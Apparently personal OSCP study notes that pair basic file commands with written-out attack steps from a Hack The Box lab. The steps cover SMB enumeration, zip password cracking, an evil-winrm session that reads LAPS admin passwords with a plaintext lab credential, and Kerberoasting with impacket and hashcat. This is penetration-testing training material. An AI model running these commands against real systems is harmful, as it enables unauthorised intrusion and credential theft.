# OSCP


File Management:-

	Linux:-
		
		ls -la : show hidden files & size & permissions.
		lsattr : list files attribute and if you can append even if you don't have write permission.
		chattr : change files attribute (a:append,e:can't change,I:can't delete or move,etc..).	
		ln originFile copyFile : to make hard link of originFile to copyFile
		ln -s sourceFile copyFile : to make a soft link(shortcut in windows) to sourceFile, you will find -i when you ls -la copyFile.




	Windows:-
	
		dir /(A,S,Q): display files attributes,files in directories & sub directories,files owner.
		
		
SMB Enumeration:-

	enum4linux,nmap to get domain controller + user 
	smbmap -H 10.10.11.152 -u 'guest' -d Timelapse.htb     --- to search for readable/writable shares you can use -R for recursive 
	smbclient //10.10.11.152/Shares -U Timelapse.htb/guest  --- to connect where Timelapse.htb is the domain controller and guest is the user
	
	
Password Attacks

	fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip	--- to crack zip files


General Information:-

	PFX files contains certificate and private key which can be extracted using openssl
	evil-winrm -k private.key -c public.key -i 10.10.11.152 -S   ---- to connect to winrm on port 5986 with ssl 
	example of evil-winrm to hack active directory:
			*Evil-WinRM* PS C:\users> $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
			*Evil-WinRM* PS C:\users> $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
			*Evil-WinRM* PS C:\users> $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
			invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user svc_deploy}
			invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime}
	

	
Active Directory Attacks:-

	Kerberoasting: Post exploitation attack, require a valid user (TGT) to request TGS from a service account with SPN and crack the TGS to get the credentials out of it (TGS is encrypted with the NTLM hash of the SPN account password).
		Tools that can be used:-
			1-Rubeus
			2-Impacket GetUserSPNs.py
			3-Powershell scripts, etc..
		Steps:-
			impacket-GetUserSPNs test.int/yazan:'yazan' -dc-ip 192.168.100.200   //serach for SPN that can help us in escilating priv.
			impacket-GetUserSPNs test.int/yazan:'yazan' -dc-ip 192.168.100.200 -request -outputfile output.hash // save the hash
			hashcat --force -m 13100 -a 0 output.hash rockyou.txt //dictionary attack to get the password 
		
		Prevention:-
			Use strong and complex password or host based password insted of user based password.
